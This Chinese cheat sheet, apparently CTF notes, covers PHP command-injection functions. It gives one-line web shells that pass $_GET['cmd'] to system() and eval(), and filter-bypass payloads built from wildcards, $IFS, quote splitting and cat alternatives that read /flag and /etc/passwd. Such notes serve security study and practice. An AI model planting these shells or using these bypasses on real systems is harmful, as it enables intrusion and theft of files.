## 常见危险函数

#### 命令执行函数：

+ `shell_exec()`
+ `system()`
+ `exec()`
+ `passthru()`
+ `pcntl_exec()`
+ ``popen()`
+ `proc_open()`
+ ````（反引号）`

测试代码：

```
<?php @system($_GET['cmd']);?>
```

#### php代码执行函数：

+ `eval()`
+ `assert()`
+ `preg_replace()`
+ `call_user_func()`

测试代码：

```
<?php @eval($_GET['cmd']);?>
```



**特别说明：**

1. `system` 函数：
	- 执行指定的命令，并输出命令的结果。
	- 返回最后一行命令的输出，如果执行失败则返回 `false` 。
2. `exec` 函数：
	- 执行指定的命令，但不输出结果。
	- 返回命令执行结果的最后一行。通过提供第二个参数，可以以数组形式获取完整的输出。
3. `passthru` 函数：
	- 执行指定的命令，并直接将命令的原始输出发送到浏览器。
	- 函数返回 `NULL` 。





## 各种绕过

#### 通配符绕过

```
?绕过：表示匹配任意单个字符
*绕过：表示匹配任意数量（包括零个）的字符
[]绕过：用于匹配方括号内的任意一个字符。例如，[abc] 可以匹配 a、b 或 c 
[-]绕过：用于指定一个字符范围。例如，[a-z] 匹配从 a 到 z 范围内的任意小写字母
{}绕过：用于指定可重复的模式。例如，{a,b,c} 可以匹配 a、b 或 c
```

#### 反斜杠绕过

```
fl\ag.php
```

#### 双引号绕过

```
fl"ag".php
```

#### 空格绕过

```
//$IFS在linux下表示分隔符
$IFS
${IFS}
$IFS$9
$IFS$1
———————————————————————————————————————————————————————————————————————————————————————————————————————————————————
这两个也行
<
<>
———————————————————————————————————————————————————————————————————————————————————————————————————————————————————
//用逗号实现空格功能
{cat,flag.php}
———————————————————————————————————————————————————————————————————————————————————————————————————————————————————
//url传递,这个好像必须在php环境
%09
%20
```

### 关键字绕过

##### cat过滤

```
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
sh /flag 2>%261  //报错出文件内容
strings:可以查看
rev:反过来看
新增一个xxd可以读取文件
———————————————————————————————————————————————————————————————————————————————————————————————————————————————————
骚操作
curl file:///flag 也行
bash -v /etc/passwd
date -f 好像可以越权读取文件
```

另外，也可以考虑用`cp`和`mv`函数将文件重命名来读取

---

执行Linux的系统命令时，可以在命令前加上井号，可以获取长度，在构造命令时非常有用

```
示例:
$RANDOM
它会生成一个随机数，长度一般是 4 位或者 5 位，也就是说我们可以由此得到 4 或者 5 。
------------> ${#RAMDOM}
```

